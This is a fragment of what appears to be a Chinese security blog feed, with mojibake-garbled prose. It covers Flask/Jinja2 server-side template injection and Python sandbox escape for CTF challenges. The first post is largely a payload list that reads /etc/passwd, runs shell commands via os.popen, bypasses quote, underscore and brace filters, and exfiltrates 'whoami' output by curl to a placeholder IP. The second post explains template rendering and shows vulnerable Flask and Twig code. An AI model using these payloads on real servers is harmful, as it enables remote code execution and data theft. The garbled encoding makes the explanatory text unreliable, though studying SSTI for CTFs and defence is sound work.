class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">2</span>]<span class="hljs-string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>)</code></pre><p><strong>pop()</strong></p><pre><code class="hljs gcode"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__<span class="hljs-comment">(2)</span>.__subclasses__<span class="hljs-comment">()</span>.pop<span class="hljs-comment">(40)</span><span class="hljs-comment">(&#x27;/etc/passwd&#x27;)</span>.read<span class="hljs-comment">()</span></code></pre><p><strong>å­—å…¸è¯»å–</strong></p><pre><code class="hljs python">__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>]()__builtins__.eval()</code></pre><p>ç»è¿‡æµ‹è¯•è¿™ç§æ–¹æ³•åœ¨pythonè§£é‡Šå™¨é‡Œä¸èƒ½æ‰§è¡Œï¼Œä½†æ˜¯åœ¨æµ‹è¯•çš„é¢˜ç›®ç¯å¢ƒä¸‹å¯ä»¥æ‰§è¡Œ</p><h5 id="è¿‡æ»¤å¼•å·"><a class="header-anchor" href="#è¿‡æ»¤å¼•å·">ğŸ­</a>è¿‡æ»¤å¼•å·</h5><p>å…ˆè·å–chrå‡½æ•°ï¼Œèµ‹å€¼ç»™chrï¼Œåé¢æ‹¼æ¥å­—ç¬¦ä¸²</p><pre><code class="hljs hy">&#123; % set chr=().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.chr % &#125; &#123; &#123; ().__class__.__bases__.__getitem__(<span class="hljs-number">0</span>).__subclasses__().pop(<span class="hljs-number">40</span>)(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read() &#125; &#125;</code></pre><p>æˆ–è€…å€ŸåŠ©requestå¯¹è±¡ï¼šï¼ˆè¿™ç§æ–¹æ³•åœ¨æ²™ç›’ç§ä¸è¡Œï¼Œåœ¨webä¸‹æ‰è¡Œï¼Œå› ä¸ºéœ€è¦ä¼ å‚ï¼‰</p><pre><code class="hljs gcode">&#123; &#123; <span class="hljs-comment">()</span>.__class__.__bases__.__getitem__<span class="hljs-comment">(0)</span>.__subclasses__<span class="hljs-comment">()</span>.pop<span class="hljs-comment">(40)</span><span class="hljs-comment">(request.args.path)</span>.read<span class="hljs-comment">()</span> &#125; &#125;&amp;path=/etc/passwd</code></pre><p><strong>PSï¼šå°†å…¶ä¸­çš„request.argsæ”¹ä¸ºrequest.valuesåˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚</strong></p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><pre><code class="hljs reasonml">&#123; % set chr=<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr % &#125; &#123; &#123; <span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span>.pop(<span class="hljs-number">59</span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(chr(<span class="hljs-number">105</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">100</span>)).read<span class="hljs-literal">()</span> &#125; &#125;&#123; &#123;<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__getitem__</span>(</span></span><span class="hljs-number">0</span>).<span class="hljs-constructor">__subclasses__()</span>.pop(<span class="hljs-number">59</span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(request.args.cmd).read<span class="hljs-literal">()</span> &#125; &#125;&amp;cmd=id</code></pre><h5 id="è¿‡æ»¤åŒä¸‹åˆ’çº¿"><a class="header-anchor" href="#è¿‡æ»¤åŒä¸‹åˆ’çº¿">ğŸ­</a>è¿‡æ»¤åŒä¸‹åˆ’çº¿__</h5><pre><code class="hljs markdown">&#123; &#123; &#x27;&#x27;[<span class="hljs-string">request.args.class</span>][<span class="hljs-symbol">request.args.mro</span>][<span class="hljs-string">2</span>][<span class="hljs-symbol">request.args.subclasses</span>]()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read() &#125; &#125;&amp;class=<span class="hljs-strong">__class__</span>&amp;mro=<span class="hljs-strong">__mro__</span>&amp;subclasses=<span class="hljs-strong">__subclasses__</span></code></pre><h5 id="è¿‡æ»¤"><a class="header-anchor" href="#è¿‡æ»¤">ğŸ­</a>è¿‡æ»¤{ {</h5><pre><code class="hljs clojure">&#123; % if &#x27;&#x27;.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.popen(<span class="hljs-name">&#x27;curl</span> http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;).read()==&#x27;p&#x27; % &#125;<span class="hljs-number">1</span>&#123; % endif % &#125;</code></pre><h5 id="reloadæ–¹æ³•"><a class="header-anchor" href="#reloadæ–¹æ³•">ğŸ­</a>reloadæ–¹æ³•</h5><p>CTFé¢˜ä¸­æ²™ç›’ç¯å¢ƒå¯èƒ½ä¼šé˜‰å‰²ä¸€äº›æ¨¡å—ï¼Œå…¶ä¸­å†…å»ºå‡½æ•°ä¸­å¤šåŠä¼šè¢«åˆ é™¤ã€‚å¦‚æœreloadè¿˜å¯ä»¥ç”¨åˆ™å¯ä»¥é‡è½½</p><pre><code class="hljs sqf">del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;__import__&#x27;</span>]del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>]del <span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;execfile&#x27;</span>]<span class="hljs-built_in">reload</span>(<span class="hljs-variable">__builtins__</span>)</code></pre><h5 id="getattribute-æ–¹æ³•"><a class="header-anchor" href="#getattribute-æ–¹æ³•">ğŸ­</a><code>__getattribute__</code>æ–¹æ³•</h5><p>è¿™ä¸ªæ–¹æ³•ä¹‹å‰ä»‹ç»è¿‡äº†ï¼Œè·å–å±æ€§ã€‚</p><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">60</span>].__init__.__getattribute__(<span class="hljs-string">&#x27;func_global&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>]<span class="hljs-comment"># ç­‰ä»·äº</span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">60</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>]</code></pre><h5 id="ä¸åˆ©ç”¨-globals"><a class="header-anchor" href="#ä¸åˆ©ç”¨-globals">ğŸ­</a>ä¸åˆ©ç”¨<code>__globals__</code></h5><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre><h5 id="timeit"><a class="header-anchor" href="#timeit">ğŸ­</a>timeit</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> timeittimeit.timeit(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="hljs-number">1</span>)</code></pre><h5 id="platform"><a class="header-anchor" href="#platform">ğŸ­</a>platform</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> platform<span class="hljs-keyword">print</span> platform.popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read()</code></pre><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>sstiæœ‰ç‚¹å¹¿ï¼Œè¿™é‡Œæåˆ°çš„ä¸€äº›payloadæ˜¯ä¸ªå¤§ä½“ç»“æ„ï¼Œé‡åˆ°é¢˜ç›®è¦è§†æƒ…å†µæ”¹ç¼–payloadè¿›è¡Œæµ‹è¯•</p><p>å‚è€ƒï¼š</p><p><a href="https://www.anquanke.com/post/id/188172#h3-10">SSTI/æ²™ç›’é€ƒé€¸è¯¦æƒ…æ€»ç»“</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹sstiæ¼æ´</a></p><p><a href="http://www.bubuko.com/infodetail-3516225.html">ssti</a></p><p><a href="https://xz.aliyun.com/t/3679#toc-4">flaskä¹‹sstiæ¨¡æ¿æ³¨å…¥</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI(ä¸€)</title>
    <link href="/2021/04/05/wei/"/>
    <url>/2021/04/05/wei/</url>
    
    <content type="html"><![CDATA[<p><code>Server-Side-Template-Injection</code>ï¼ŒæœåŠ¡ç«¯æ¨¡ç‰ˆæ³¨å…¥æ”»å‡»ã€‚</p><p>æœåŠ¡ç«¯æ¨¡ç‰ˆå¼•æ“å°†ç”¨æˆ·çš„è¾“å…¥ç›´æ¥æ¸²æŸ“è¿›æ¨¡ç‰ˆï¼Œè€Œæœªåšè¿‡æ»¤æˆ–è€…å¯¹è±¡å…³ç³»æ˜ å°„<code>(ORM)</code>ã€‚å¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶æ¸²æŸ“è¿›æ¨¡ç‰ˆçš„å†…å®¹ã€‚é€šè¿‡ç›´æ¥è¾“å…¥æ¨¡ç‰ˆæ¸²æŸ“çš„å…³é”®è¯ä¾‹å¦‚{ { } }ï¼Œå³å¯å°†æ¶æ„ä»£ç æ³¨å…¥æ¨¡ç‰ˆä¸­æ‰§è¡Œã€‚<br>ç°åœ¨æœ€å¸¸è§çš„æ¨¡ç‰ˆæ¸²æŸ“å¼•æ“æ˜¯åŸºäºPythonçš„<code>Flask</code>æ¡†æ¶ï¼Œä½†æ˜¯æ¨¡æ¿æ³¨å…¥è¿˜å­˜åœ¨äºè®¸å¤šåœ°æ–¹ã€‚<code>ä¸ XSS ä¸åŒï¼Œæ¨¡æ¿æ³¨å…¥å¯ç”¨äºç›´æ¥æ”»å‡» Web æœåŠ¡å™¨çš„å†…éƒ¨ï¼Œå¹¶ç»å¸¸è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå°†æ¯ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºéƒ½è½¬å˜ä¸ºæ½œåœ¨çš„æ¢è½´ç‚¹ã€‚</code>æ¨¡æ¿å¼•æ“ä¹Ÿä¼šæä¾›æ²™ç®±æœºåˆ¶æ¥è¿›è¡Œæ¼æ´é˜²èŒƒï¼Œä½†æ˜¯å¯ä»¥ç”¨æ²™ç®±é€ƒé€¸æŠ€æœ¯æ¥è¿›è¡Œç»•è¿‡.</p><h2 id="æ¨¡æ¿æ¸²æŸ“"><a class="header-anchor" href="#æ¨¡æ¿æ¸²æŸ“">ğŸ­</a>æ¨¡æ¿æ¸²æŸ“</h2><p>æ¨¡æ¿æ˜¯ç”¨äºä»æ•°æ®ï¼ˆå˜é‡ï¼‰åˆ°å®é™…çš„è§†è§‰è¡¨ç°ï¼ˆHTMLä»£ç ï¼‰çš„ä¸€ç§å®ç°æ‰‹æ®µã€‚</p><h5 id="åç«¯æ¸²æŸ“"><a class="header-anchor" href="#åç«¯æ¸²æŸ“">ğŸ­</a>åç«¯æ¸²æŸ“</h5><p>æµè§ˆå™¨ç›´æ¥æ¥æ”¶ç»è¿‡æœåŠ¡å™¨è®¡ç®—(æœåŠ¡å™¨ç»è¿‡è§£æå­˜æ”¾åœ¨æœåŠ¡å™¨ç«¯çš„æ¨¡æ¿æ–‡ä»¶)ä¹‹åçš„å‘ˆç°ç»™ç”¨æˆ·çš„æœ€ç»ˆçš„HTMLå­—ç¬¦ä¸²ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨<strong>åªè¿›è¡Œäº†HTMLçš„è§£æ</strong>ï¼Œä»¥åŠé€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„æ“çºµæ˜¾ç¤ºå™¨æ˜¾ç¤ºå†…å®¹çš„ç³»ç»Ÿè°ƒç”¨åœ¨æ˜¾ç¤ºå™¨ä¸ŠæŠŠHTMLæ‰€ä»£è¡¨çš„å›¾åƒæ˜¾ç¤ºç»™ç”¨æˆ·.</p><h5 id="å‰ç«¯æ¸²æŸ“"><a class="header-anchor" href="#å‰ç«¯æ¸²æŸ“">ğŸ­</a>å‰ç«¯æ¸²æŸ“</h5><p>æµè§ˆå™¨ä»åç«¯å¾—åˆ°ä¸€äº›ä¿¡æ¯(é€‚ç”¨äºangularjsçš„æ¨¡æ¿æ–‡ä»¶ï¼Œæˆ–æ˜¯JSONç­‰å„ç§æ•°æ®äº¤æ¢æ ¼å¼æ‰€åŒ…è£…çš„æ•°æ®ï¼Œåˆæ³•çš„HTMLå­—ç¬¦ä¸²)å°†è¿™äº›ä¿¡æ¯ç»„ç»‡æ’åˆ—å½¢æˆæœ€ç»ˆå¯è¯»çš„HTMLå­—ç¬¦ä¸²æ˜¯ç”±æµè§ˆå™¨æ¥å®Œæˆçš„ï¼Œåœ¨å½¢æˆäº†HTMLå­—ç¬¦ä¸²ä¹‹åï¼Œå†è¿›è¡Œæ˜¾ç¤º.</p><blockquote><blockquote><p>ä½¿ç”¨ render_template() æ–¹æ³•æ¥æ¸²æŸ“æ¨¡æ¿:å°†æ¨¡æ¿åå’Œä½ æƒ³ä½œä¸ºå…³é”®å­—çš„å‚æ•°ä¼ å…¥æ¨¡æ¿çš„å˜é‡</p></blockquote></blockquote><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template@app.route(<span class="hljs-string">&#x27;/hello/&#x27;</span>)@app.route(<span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span>)def hello(<span class="hljs-type">name</span>=<span class="hljs-keyword">None</span>):     <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, <span class="hljs-type">name</span>=<span class="hljs-type">name</span>)</code></pre><blockquote><blockquote><p>render_templateå‡½æ•°æ¸²æŸ“çš„æ˜¯templatesä¸­çš„æ¨¡æ¿,ä¹Ÿå°±æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„htmlï¼Œé‡Œé¢çš„å‚æ•°éœ€è¦æˆ‘ä»¬æ ¹æ®æ¯ä¸ªç”¨æˆ·éœ€æ±‚ä¼ å…¥åŠ¨æ€å˜é‡ã€‚</p></blockquote></blockquote><h4 id="å¸¸è§æ¨¡æ¿å¼•æ“"><a class="header-anchor" href="#å¸¸è§æ¨¡æ¿å¼•æ“">ğŸ­</a>å¸¸è§æ¨¡æ¿å¼•æ“</h4><p><img src="/2021/04/05/wei/1.png" alt="1"></p><p><em>PHPä¸­è¿˜æœ‰ä¸€ä¸ªBlade ï¼Œå®ƒå’Œå…¶ä»–æµè¡Œçš„ PHP æ¨¡æ¿å¼•æ“ä¸ä¸€æ ·ï¼ŒBlade å¹¶ä¸é™åˆ¶ä½ åœ¨è§†å›¾ä¸­ä½¿ç”¨åŸç”Ÿ PHP ä»£ç ã€‚æ‰€æœ‰ Blade è§†å›¾æ–‡ä»¶éƒ½å°†è¢«ç¼–è¯‘æˆåŸç”Ÿçš„ PHP ä»£ç å¹¶ç¼“å­˜èµ·æ¥ï¼Œé™¤éå®ƒè¢«ä¿®æ”¹ï¼Œå¦åˆ™ä¸ä¼šé‡æ–°ç¼–è¯‘ã€‚</em></p><p><em>FreeMarkeræ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼š å³ä¸€ç§åŸºäºæ¨¡æ¿å’Œè¦æ”¹å˜çš„æ•°æ®ï¼Œ å¹¶ç”¨æ¥ç”Ÿæˆè¾“å‡ºæ–‡æœ¬ï¼ˆHTMLç½‘é¡µã€ç”µå­é‚®ä»¶ã€é…ç½®æ–‡ä»¶ã€æºä»£ç ç­‰ï¼‰çš„é€šç”¨å·¥å…·ã€‚ å®ƒä¸æ˜¯é¢å‘æœ€ç»ˆç”¨æˆ·çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªJavaç±»åº“ï¼Œæ˜¯ä¸€æ¬¾ç¨‹åºå‘˜å¯ä»¥åµŒå…¥ä»–ä»¬æ‰€å¼€å‘äº§å“çš„ç»„ä»¶ã€‚</em></p><h4 id="PHPå®ä¾‹"><a class="header-anchor" href="#PHPå®ä¾‹">ğŸ­</a>PHPå®ä¾‹</h4><p>å°†åç§°ä¼ é€’åˆ°æ¨¡æ¿ä¸­ï¼š</p><pre><code class="hljs php">$output = $twig-&gt;render(<span class="hljs-string">&quot;Dear &#123;first_name&#125;,&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre><p>å…è®¸ç”¨æˆ·è‡ªå®šä¹‰è¿™äº›ç”µå­é‚®ä»¶ï¼ˆå¼€å‘è€…å°†ç”¨æˆ·çš„è¾“å…¥ç›´æ¥æ”¾åœ¨è¦æ¸²æŸ“çš„å­—ç¬¦ä¸²ä¸­ï¼‰ï¼š</p><pre><code class="hljs php">$output = $twig-&gt;render($_GET[<span class="hljs-string">&#x27;custom_email&#x27;</span>],  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;first_name&quot;</span> =&gt; $user.first_name) );</code></pre><p>ç”¨æˆ·é€šè¿‡custom_email GET å‚æ•°æ§åˆ¶æ¨¡æ¿æœ¬èº«çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ä¼ é€’ç»™æ¨¡æ¿çš„å€¼ã€‚</p><h4 id="pythonå®ä¾‹"><a class="header-anchor" href="#pythonå®ä¾‹">ğŸ­</a>pythonå®ä¾‹</h4><p>å…¸å‹flask:</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request    <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string    app = Flask(__name__)<span class="hljs-meta">    @app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>        template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">            &lt;div class=&quot;center-content error&quot;&gt;</span><span class="hljs-string">                &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><span class="hljs-string">                &lt;h3&gt;%s&lt;/h3&gt;</span><span class="hljs-string">            &lt;/div&gt; </span><span class="hljs-string">        &#x27;&#x27;&#x27;</span> %(request.url)  //ç¨‹åºå‘˜å› ä¸ºçœäº‹å¹¶ä¸ä¼šä¸“é—¨å†™ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œè€Œæ˜¯ç›´æ¥å½“å­—ç¬¦ä¸²æ¥æ¸²æŸ“ã€‚å¹¶ä¸”request.urlæ˜¯å¯æ§çš„<span class="hljs-keyword">return</span> render_template_string(template)    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:        app.debug = <span class="hljs-literal">True</span>        app.run()</code></pre><p><code>render_template_string</code>å‡½æ•°åœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ä½¿ç”¨%såŠ¨æ€åœ°æ›¿æ¢å­—ç¬¦ä¸²ï¼ŒFlask ä¸­ä½¿ç”¨Jinja2 ä½œä¸ºæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œ{ { } }æ˜¯Jinja2çš„å˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{ { } }åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{ {1+1} }ä¼šè¢«è§£ææˆ2ã€‚<strong>flaskåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ‰‹æ®µï¼ŒæŠ¥é”™404ï¼Œè¿”å›å½“å‰é”™è¯¯urlï¼Œé€šå¸¸CTFçš„flaskå¦‚æœæ˜¯sstiï¼Œé‚£ä¹ˆå…«ä¹ä¸ç¦»åå°±æ˜¯åŸºäºè¿™æ®µä»£ç ï¼Œå¤šçš„å°±æ˜¯ä¸€äº›è¿‡æ»¤å’Œä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„æ–¹æ³•å‡½æ•°ã€‚</strong></p><blockquote><p><strong>routeè£…é¥°å™¨è·¯ç”±</strong></p><p><code>@app.route('/')</code></p><blockquote><p>ä½¿ç”¨routeï¼ˆï¼‰è£…é¥°å™¨å‘Šè¯‰Flaskä»€ä¹ˆæ ·çš„URLå¯è§¦å‘å‡½æ•°.routeï¼ˆï¼‰è£…é¥°å™¨æŠŠä¸€ä¸ªå‡½æ•°ç»‘å®šåˆ°å¯¹åº”çš„URLä¸Šï¼Œè¿™å¥è¯ç›¸å½“äºè·¯ç”±ï¼Œä¸€ä¸ªè·¯ç”±è·Ÿéšä¸€ä¸ªå‡½æ•°ï¼Œå¦‚</p><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span><span class="hljs-string">return 123</span></code></pre><p>è®¿é—®localhost:5000/åˆ™ä¼šè¾“å‡º123ï¼Œä¿®æ”¹ä¸€ä¸‹:</p><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&#x27;/test&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><span class="hljs-string">&quot;</span><span class="hljs-string">return 123</span></code></pre><p>è¿™æ—¶å€™è®¿é—®localhost:5000/testä¼šè¾“å‡º123,æ­¤å¤–è¿˜å¯ä»¥è®¾ç½®åŠ¨æ€ç½‘å€:</p><pre><code class="hljs ruby">@app.route(<span class="hljs-string">&quot;/hello/&lt;username&gt;&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_user</span><span class="hljs-params">(username)</span></span><span class="hljs-symbol">:</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user:%s&quot;</span>%username</code></pre><p>æ ¹æ®urlé‡Œçš„è¾“å…¥ï¼ŒåŠ¨æ€è¾¨åˆ«èº«ä»½.ä¹Ÿå¯ä»¥ä½¿ç”¨intå‹ï¼Œè½¬æ¢å™¨æœ‰ä¸‹é¢å‡ ç§ï¼š</p><pre><code class="hljs ruby">int      æ¥å—æ•´æ•°float    åŒ int ï¼Œä½†æ˜¯æ¥å—æµ®ç‚¹æ•°path     å’Œé»˜è®¤çš„ç›¸ä¼¼ï¼Œä½†ä¹Ÿæ¥å—æ–œçº¿@app.route(<span class="hljs-string">&#x27;/post/&lt;int:post_id&gt;&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_post</span><span class="hljs-params">(post_id)</span></span><span class="hljs-symbol">:</span><span class="hljs-comment"># show the post with the given id, the id is an integer</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Post %d&#x27;</span> % post_id</code></pre></blockquote></blockquote><blockquote><p>mainå…¥å£</p><blockquote><p>å½“.pyæ–‡ä»¶è¢«ç›´æ¥è¿è¡Œæ—¶ï¼Œ<code>if name == â€˜mainâ€˜</code>ä¹‹ä¸‹çš„ä»£ç å—å°†è¢«è¿è¡Œï¼›å½“.pyæ–‡ä»¶ä»¥æ¨¡å—å½¢å¼è¢«å¯¼å…¥æ—¶ï¼Œ<code>if name ==  â€˜mainâ€˜</code>ä¹‹ä¸‹çš„ä»£ç å—ä¸è¢«è¿è¡Œå°è„šæœ¬ä¸éœ€è¦è¿™ä¸ªä¸œè¥¿ï¼Œä½†æ˜¯å¦‚æœéœ€è¦åšä¸€ä¸ªç¨å¾®å¤§ä¸€ç‚¹çš„pythonå¼€å‘ï¼Œå†™ <code>if name ==â€™main__â€™  </code>æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ä¹ æƒ¯ï¼Œå¤§ä¸€ç‚¹çš„pythonè„šæœ¬è¦åˆ†å¼€å‡ ä¸ªæ–‡ä»¶æ¥å†™ï¼Œä¸€ä¸ªæ–‡ä»¶è¦ä½¿ç”¨å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ¨¡å—ï¼Œæ­¤æ—¶è¿™ä¸ªifå°±ä¼šèµ·åˆ°ä½œç”¨ä¸ä¼šè¿è¡Œè€Œæ˜¯ç±»ä¼¼äºæ–‡ä»¶åŒ…å«æ¥ä½¿ç”¨ã€‚</p></blockquote></blockquote><h4 id="æ£€æµ‹"><a class="header-anchor" href="#æ£€æµ‹">ğŸ­</a>æ£€æµ‹</h4><p>å‘ä¼ é€’çš„å‚æ•°ä¸­æ‰¿è½½ç‰¹å®š Payload  å¹¶æ ¹æ®è¿”å›çš„å†…å®¹æ¥è¿›è¡Œåˆ¤æ–­çš„ã€‚æ¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“éƒ½æœ‰ç€è‡ªå·±çš„è¯­æ³•ï¼ŒPayload çš„æ„é€ éœ€è¦é’ˆå¯¹å„ç±»æ¨¡æ¿å¼•æ“åˆ¶å®šå…¶ä¸åŒçš„æ‰«æè§„åˆ™ï¼Œå°±å¦‚åŒ SQL  æ³¨å…¥ä¸­æœ‰ç€ä¸åŒçš„æ•°æ®åº“ç±»å‹ä¸€æ ·ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ›´æ”¹è¯·æ±‚å‚æ•°ä½¿ä¹‹æ‰¿è½½å«æœ‰æ¨¡æ¿å¼•æ“è¯­æ³•çš„ Payloadï¼Œé€šè¿‡é¡µé¢æ¸²æŸ“è¿”å›çš„å†…å®¹æ£€æµ‹æ‰¿è½½çš„ Payload æ˜¯å¦æœ‰å¾—åˆ°ç¼–è¯‘è§£æã€‚ä¸¾ä¾‹ï¼š</p><p><img src="/2021/04/05/wei/3.jpg" alt="3"></p><h2 id="æ”»å‡»"><a class="header-anchor" href="#æ”»å‡»">ğŸ­</a>æ”»å‡»</h2><h4 id="æ”»å‡»æ–¹å‘-ä¸€"><a class="header-anchor" href="#æ”»å‡»æ–¹å‘-ä¸€">ğŸ­</a>æ”»å‡»æ–¹å‘(ä¸€)</h4><ul><li>æ¨¡æ¿ï¼šè¯­æ³•ã€å†…ç½®å˜é‡ã€å±æ€§ã€å‡½æ•°</li><li>æ¡†æ¶ï¼šå…¨å±€å˜é‡ã€å±æ€§ã€å‡½æ•°</li><li>è¯­è¨€</li><li>åº”ç”¨</li></ul><h4 id="åˆ©ç”¨æ¨¡æ¿æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æ¨¡æ¿æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æ¨¡æ¿æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»</h4><h5 id="Smarty"><a class="header-anchor" href="#Smarty">ğŸ­</a>Smarty</h5><p>Smartyæ˜¯æœ€æµè¡Œçš„PHPæ¨¡æ¿è¯­è¨€ä¹‹ä¸€ï¼Œä¸ºä¸å—ä¿¡ä»»çš„æ¨¡æ¿æ‰§è¡Œæä¾›äº†å®‰å…¨æ¨¡å¼ã€‚è¿™ä¼šå¼ºåˆ¶æ‰§è¡Œåœ¨ php 